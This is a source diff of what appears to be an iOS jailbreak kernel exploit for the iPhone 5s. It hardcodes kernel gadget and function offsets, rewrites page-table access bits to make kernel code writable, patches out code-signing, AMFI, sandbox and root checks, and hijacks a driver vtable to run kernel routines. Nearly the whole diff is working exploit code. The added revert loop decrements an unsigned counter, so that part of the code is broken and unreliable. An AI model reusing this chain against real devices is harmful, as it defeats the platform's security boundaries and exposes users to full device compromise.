@@ -873,25 +873,25 @@ struct PatchFinder
 		// These are hardcoded offsets for iPhone 5s
 
 		// gadgets
-		ADD_X0_232				= m_kernelBase + m_kaslrSlide + 0xF586C;
+		ADD_X0_232				= m_kernelBase + m_kaslrSlide + 0x0F586C;
 		LDR_X0_X8_W1_SXTW_2		= m_kernelBase + m_kaslrSlide + 0x3834C8;
 		STRB_W1_X8_W2_UXTW		= m_kernelBase + m_kaslrSlide + 0x3A13CC;
 		LDR_X0_X1_32			= m_kernelBase + m_kaslrSlide + 0x3DA2AC;
 		STR_W3_X1_W2_UXTW		= m_kernelBase + m_kaslrSlide + 0xED4670;
 		//
-		INVALIDATE_TLB			= m_kernelBase + m_kaslrSlide + 0xDEAD0;
-		FLUSHCACHE				= m_kernelBase + m_kaslrSlide + 0xCDC84;
+		INVALIDATE_TLB			= m_kernelBase + m_kaslrSlide + 0x0DEAD0;
+		FLUSHCACHE				= m_kernelBase + m_kaslrSlide + 0x0CDC84;
 		//
 		AMFI_GET_OUT_OF_MY_WAY	= m_kernelBase + m_kaslrSlide + 0x6AF290;
 		MOUNT_COMMON			= m_kernelBase + m_kaslrSlide + 0x110ABC;
 		CS_ENFORCE				= m_kernelBase + m_kaslrSlide + 0x6AF291;
-		VM_MAP_ENTER			= m_kernelBase + m_kaslrSlide + 0x84648;
-		VM_MAP_PROTECT			= m_kernelBase + m_kaslrSlide + 0x86298;
+		VM_MAP_ENTER			= m_kernelBase + m_kaslrSlide + 0x084648;
+		VM_MAP_PROTECT			= m_kernelBase + m_kaslrSlide + 0x086298;
 		TFP0					= m_kernelBase + m_kaslrSlide + 0x37C2B0;
 		GET_R00T				= m_kernelBase + m_kaslrSlide + 0x314E98;
 		ICHDB_1					= m_kernelBase + m_kaslrSlide + 0x526804;
 		ICHDB_2					= m_kernelBase + m_kaslrSlide + 0x525EF4;
-		PROC_ENFORCE			= m_kernelBase + m_kaslrSlide + 0xC4BEF64;
+		PROC_ENFORCE			= m_kernelBase + m_kaslrSlide + 0x4BEF64;
 		MAPIO					= m_kernelBase + m_kaslrSlide + 0xFBDEEC;
 		SB_TRACE				= m_kernelBase + m_kaslrSlide + 0xCC1750;
 		//
@@ -1255,18 +1255,19 @@ int main(int argc, char** argv)
 		} \
 
 		uint64_t pages[50];
+
 		int page_cnt = 0;
-		pages[page_cnt++] = patchFinder.GET_R00T		& (~0xFFF);
-		pages[page_cnt++] = patchFinder.VM_MAP_ENTER	& (~0xFFF);
-		pages[page_cnt++] = patchFinder.VM_MAP_PROTECT	& (~0xFFF);
-		pages[page_cnt++] = patchFinder.MOUNT_COMMON	& (~0xFFF);
-		pages[page_cnt++] = patchFinder.TFP0			& (~0xFFF);
-		pages[page_cnt++] = patchFinder.CS_ENFORCE		& (~0xFFF);
-		pages[page_cnt++] = patchFinder.PROC_ENFORCE	& (~0xFFF);
-		pages[page_cnt++] = patchFinder.ICHDB_1			& (~0xFFF);
-		pages[page_cnt++] = patchFinder.ICHDB_2			& (~0xFFF);
-		pages[page_cnt++] = patchFinder.MAPIO			& (~0xFFF);
-		pages[page_cnt++] = patchFinder.SB_TRACE		& (~0xFFF);
+		pages[page_cnt++] = patchFinder.GET_R00T		& (~0xFFF); // 0
+		pages[page_cnt++] = patchFinder.VM_MAP_ENTER	& (~0xFFF); // 1
+		pages[page_cnt++] = patchFinder.VM_MAP_PROTECT	& (~0xFFF); // 2
+		pages[page_cnt++] = patchFinder.MOUNT_COMMON	& (~0xFFF); // 3
+		pages[page_cnt++] = patchFinder.TFP0			& (~0xFFF); // 4
+		pages[page_cnt++] = patchFinder.CS_ENFORCE		& (~0xFFF); // 5
+		pages[page_cnt++] = patchFinder.PROC_ENFORCE	& (~0xFFF); // 6
+		pages[page_cnt++] = patchFinder.ICHDB_1			& (~0xFFF); // 7
+		pages[page_cnt++] = patchFinder.ICHDB_2			& (~0xFFF); // 8
+		pages[page_cnt++] = patchFinder.MAPIO			& (~0xFFF); // 9
+		pages[page_cnt++] = patchFinder.SB_TRACE		& (~0xFFF); // 10
 
 		// work with memory pages
 		// get PDE
@@ -1274,91 +1275,149 @@ int main(int argc, char** argv)
 		ReadWhere64(patchFinder.KERNEL_PMAP, pmap_store);
 		UTZLog(@"[INF:UTZ] pmap_store: 0x%.16llX", pmap_store);
 		ReadWhere64(pmap_store, pde_base);
-		UTZLog(@"[INF:UTZ] pde_base: 0x%.16llX", pde_base);
+		UTZLog(@"[INF:UTZ] pde_base:   0x%.16llX", pde_base);
 		
 		// get Physical and Virtual bases
 		uint64_t gPhysBase, gVirtBase;
 		ReadWhere64(patchFinder.PHYS_ADDR, gPhysBase);
-		UTZLog(@"[INF:UTZ] gPhysBase: 0x%.16llX", gPhysBase);
+		UTZLog(@"[INF:UTZ] gPhysBase:  0x%.16llX", gPhysBase);
 		ReadWhere64(patchFinder.PHYS_ADDR - 8, gVirtBase);
-		UTZLog(@"[INF:UTZ] gVirtBase: 0x%.16llX", gVirtBase);
+		UTZLog(@"[INF:UTZ] gVirtBase:  0x%.16llX", gVirtBase);
 
 		// thanks @PanguTeam
 		
 		const uint64_t addr_start = 0xffffff8000000000; // Analytical kernel page table starting address (25 bits to 1, TTBR1_EL1 setting)
-		// Up to 3 layer mapping is 1G level2 block level1 of the block is 2M page is 4K
+		// Up to 3 levels mapping. For 4KB page granule Level1 describes mapping of 1Gb, Level2 - 2Mb
 		// First, read the value of stage1
 		uint64_t level1_data = 0;
-		uint32_t * hi_lo = (uint32_t*)&level1_data;
 		
-		ReadWhere32(pde_base, hi_lo[0]);
-		ReadWhere32(pde_base+4, hi_lo[1]);
+		// get Level1 entry
+		ReadWhere64(pde_base, level1_data);
 		
-		// read level2 (Each corresponds to 2M)
+		// read level2 (each corresponds to 2Mb)
 		uint64_t level2_base = (level1_data & 0xfffffff000) - gPhysBase + gVirtBase;
 		uint64_t level2_krnl = level2_base + (((0xffffff8002002000 + kaslr_slide - addr_start) >> 21) << 3);
-		// Use interface reads patch vtable table, after more stable
+		
+		// placeholder for 30Mb (15 Level2 entries)
 		uint64_t level2_data[15] = {0};
+		UTZLog(@"[INF:UTZ] level2_base 0x%.16llX level2_krnl 0x%.16llX", level2_base, level2_krnl);
 		
-		UTZLog(@"[INF:UTZ] level2_base %llX level2_krnl %llX", level2_base, level2_krnl);
-		
-		hi_lo = (uint32_t*)&level2_data;
-		for (int i = 0; i < sizeof(level2_data)/sizeof(uint32_t); i++) {
-			ReadWhere32(level2_krnl+(i*4), hi_lo[i]);
+		// read 16 Level2 entries (30Mb)
+		for (int i = 0; i < 15; i++) {
+			ReadWhere64(level2_krnl+(i*8), level2_data[i]);
+			UTZLog(@"[INF:UTZ] level2_data[%2d] = 0x%.16llX", i, level2_data[i]);
 		}
 		
-		UTZLog(@"[INF:UTZ] level2_data[0]=%llX level2_data[14]=%llX", level2_data[0], level2_data[14]);
+		static const uint64_t kPageDescriptorType_Mask			= 0b11;
+		static const uint64_t kPageDescriptorType_Invalid		= 0b00;
+		static const uint64_t kPageDescriptorType_Block			= 0b01;
+		static const uint64_t kPageDescriptorType_Table			= 0b11;
 		
-		// change kernel code page to RW !
-		// Try to modify the first four block
-		for (int i = 0; i < 4; i++)
-		{
-			// You must not block access and RW
-			if ((level2_data[i] & 3) != 1)
-				continue;
-			if (((level2_data[i] >> 6) & 1) != 0 || ((level2_data[i] >> 7) & 1) != 0)
+		static const uint64_t kPageDescriptorAP_Mask			= 0b11000000;
+		static const uint64_t kPageDescriptorAP_Shift			= 6;
+		static const uint64_t kPageDescriptorAP_EL1_RW_EL0_N	= 0b00;
+		static const uint64_t kPageDescriptorAP_EL1_RW_EL0_RW	= 0b01;
+		static const uint64_t kPageDescriptorAP_EL1_RO_EL0_N	= 0b10;
+		static const uint64_t kPageDescriptorAP_EL1_RO_EL0_RO	= 0b11;
+		
+		struct PagePatches {
+			uint64_t address;
+			uint64_t data;
+		} pages_patches[50] = {0};
+		uint32_t pages_patch_cnt = 0;
+		
+		auto alreadyPatched = [&pages_patches, &pages_patch_cnt](uint64_t address) -> bool {
+			for (uint32_t i=0; i < pages_patch_cnt; i++)
 			{
-				level2_data[i] &= 0xffffffffffffff3f;
-				// Covering the lower 4 bytes is enough
-				UTZLog(@"[INF:UTZ]  to patch block page table");
-				WriteWhatWhere32(level2_data[i], level2_krnl + i*8);
+				if (pages_patches[i].address == address)
+					return true;
 			}
-		}
-		// Modify the writable property address range
-		uint64_t rw_krnl_end = (((0xffffff8002002000 + kaslr_slide) >> 21) << 21) + 0x200000*3 - 1;
+			return false;
+		};
 		
 		// Rewritten page table
 		for (int i = 0; i < page_cnt; i++)
 		{
 			uint64_t rw_page_base = pages[i];
-			// if (rw_page_base <= rw_krnl_end)
-			//     continue;
 			
 			// First check level2 corresponds to the table
 			int idx = (int)(((rw_page_base - addr_start) >> 21) - (((0xffffff8002002000 + kaslr_slide) - addr_start) >> 21));
-			if ((level2_data[idx] & 3) != 3)
-				continue;
-			// level3, each corresponding to a 4K page
-			uint64_t level3_base = (level2_data[idx] & 0xfffffff000) - gPhysBase + gVirtBase;
+
+			uint64_t level2_entry = level2_data[idx];
+
+			// Handle L2 'block' descriptors
+			if ((level2_entry & kPageDescriptorType_Mask) != kPageDescriptorType_Table)
+			{
+				if ((level2_entry & kPageDescriptorType_Mask) != kPageDescriptorType_Block) {
+					NSLog(@"[ERR:UTZ] pages[%2d:%.16llX] -> L1[%2d:%.16llX] invalid L2 entry found", i, rw_page_base, idx, level2_entry);
+					continue;
+				}
+
+				// Patch L2 descriptors
+				if (((level2_entry & kPageDescriptorAP_Mask) >> kPageDescriptorAP_Shift) != kPageDescriptorAP_EL1_RW_EL0_N)
+				{
+					uint64_t level2_addr = level2_krnl+(idx*8);
+					if (alreadyPatched(level2_addr) == true)
+						continue;
+
+					pages_patches[pages_patch_cnt].address = level2_addr;
+					pages_patches[pages_patch_cnt].data = level2_entry;
+					
+					// clean AP bits
+					level2_entry &= ~kPageDescriptorAP_Mask;
+	
+					// set AP: EL1 to RW, EL0 to None (value is actaully 0b00, code is just for readability)
+					// level2_entry |= (kPageDescriptorAP_EL1_RW_EL0_N << kPageDescriptorAP_Shift) & kPageDescriptorAP_Mask
+	
+					// 32bit write is enough to covering lower attributes
+					WriteWhatWhere32(level2_entry, level2_addr);
+					
+					UTZLog(@"[INF:UTZ] pages[%2d:%.16llX] -> L2[0x%.16llX] patch %.16llX -> %.16llX", i, rw_page_base, level2_addr, pages_patches[pages_patch_cnt].data, level2_entry);
+					pages_patch_cnt++;
+					
+					continue;
+				}
+				else
+				{
+					UTZLog(@"[INF:UTZ] pages[%2d:%.16llX] -> L3[0x%.16llX] skip %.16llX", i, rw_page_base, level2_krnl+(idx*8), level2_entry);
+				}
+			}
+			
+			// Handle L2 'table' descriptors
+			
+			// Level3, each corresponding to a 4K page
+			uint64_t level3_base = (level2_entry & 0xfffffff000) - gPhysBase + gVirtBase;
 			uint64_t level3_krnl = level3_base + (((rw_page_base & 0x1fffff) >> 12) << 3);
 			
-			UTZLog(@"[INF:UTZ] va: %llx idx: %d level2: %llx level3_base: %llx pte_krnl: %llx", rw_page_base, idx, level2_data[idx], level3_base, level3_krnl);
+			// UTZLog(@"[INF:UTZ] pages[%2d:%.16llX] -> L2[%d] = L2: 0x%.16llX, level3_base: 0x%.16llX, pte_krnl: 0x%.16llX", i, rw_page_base, idx, level2_entry, level3_base, level3_krnl);
 			
 			// read pte
-			uint64_t level3_data = 0;
-			hi_lo = (uint32_t*)&level3_data;
+			uint64_t level3_entry = 0;
+			ReadWhere64(level3_krnl, level3_entry);
 			
-			ReadWhere32(level3_krnl, hi_lo[0]);
-			ReadWhere32(level3_krnl+4, hi_lo[1]);
-			
-			
-			// To RW
-			if (((level3_data >> 6) & 1) != 0 || ((level3_data >> 7) & 1) != 0)
+			// Patch L3 descriptors
+			if (((level3_entry & kPageDescriptorAP_Mask) >> kPageDescriptorAP_Shift) != kPageDescriptorAP_EL1_RW_EL0_N)
 			{
-				level3_data &= 0xffffffffffffff3f;
-				// Covering the lower 4 bytes is enough
-				UTZLog(@"[INF:UTZ]  to patch page table");
-				WriteWhatWhere32( (uint32_t)level3_data, level3_krnl);
+				if (alreadyPatched(level3_krnl) == true)
+					continue;
+
+				pages_patches[pages_patch_cnt].address = level3_krnl;
+				pages_patches[pages_patch_cnt].data = level3_entry;
+				
+				// clean AP bits
+				level3_entry &= ~kPageDescriptorAP_Mask;
+				
+				// set AP: EL1 to RW, EL0 to None (value is actaully 0b00, code is just for readability)
+				// level3_data |= (kPageDescriptorAP_EL1_RW_EL0_N << kPageDescriptorAP_Shift) & kPageDescriptorAP_Mask
+
+				// 32bit write is enough to covering lower attributes
+				WriteWhatWhere32( (uint32_t)level3_entry, level3_krnl);
+				UTZLog(@"[INF:UTZ] pages[%2d:%.16llX] -> L3[0x%.16llX] patch %.16llX -> %.16llX", i, rw_page_base, level3_krnl, pages_patches[pages_patch_cnt].data, level3_entry);
+				pages_patch_cnt++;
+			}
+			else
+			{
+				UTZLog(@"[INF:UTZ] pages[%2d:%.16llX] -> L3[0x%.16llX] skip %.16llX", i, rw_page_base, level3_krnl, level3_entry);
 			}
 		}
 		
@@ -1379,6 +1438,7 @@ int main(int argc, char** argv)
 		ReadWhere32(patchFinder.TFP0, kv);
 		UTZLog(@"[INF:UTZ] kv: 0x%016llx", kv);
 		
+		UTZLog(@"[INF:UTZ] Patching kernel...");
 		WriteWhatWhere32(0xD503201F, patchFinder.GET_R00T);
 		WriteWhatWhere32(0xD503201F, patchFinder.VM_MAP_PROTECT);
 		WriteWhatWhere32(0xF10003DF, patchFinder.VM_MAP_ENTER);
@@ -1390,12 +1450,31 @@ int main(int argc, char** argv)
 		WriteWhatWhere32(0x1, patchFinder.ICHDB_1);
 		WriteWhatWhere32(0x1, patchFinder.ICHDB_2);
 		WriteWhatWhere32(0x0, patchFinder.PROC_ENFORCE);
+		UTZLog(@"[INF:UTZ] ... done");
 		
 		ReadWhere32(patchFinder.VM_MAP_ENTER, kv);
 		UTZLog(@"[INF:UTZ] kv: 0x%016llx", kv);
 		ReadWhere32(patchFinder.TFP0, kv);
 		UTZLog(@"[INF:UTZ] kv: 0x%016llx", kv);
 		
+		// Flush cache
+		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.FLUSHCACHE;
+		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
+		ggService512.callIndex0Trap1(0);
+
+		UTZLog(@"[INF:UTZ] revert patched page descriptors (%d)", pages_patch_cnt);
+		for (uint32_t i=0; i < pages_patch_cnt ; i--)
+		{
+			// 32bit write is enough to covering lower attributes
+			WriteWhatWhere32( (uint32_t)pages_patches[i].data, pages_patches[i].address);
+			UTZLog(@"[INF:UTZ] L3[0x%.16llX] revert to %.16llX", pages_patches[i].address, pages_patches[i].data);
+		}
+		
+		// Invalidate TLB
+		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.INVALIDATE_TLB;
+		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
+		ggService512.callIndex0Trap1(0);
+
 		// Flush cache
 		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.FLUSHCACHE;
 		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
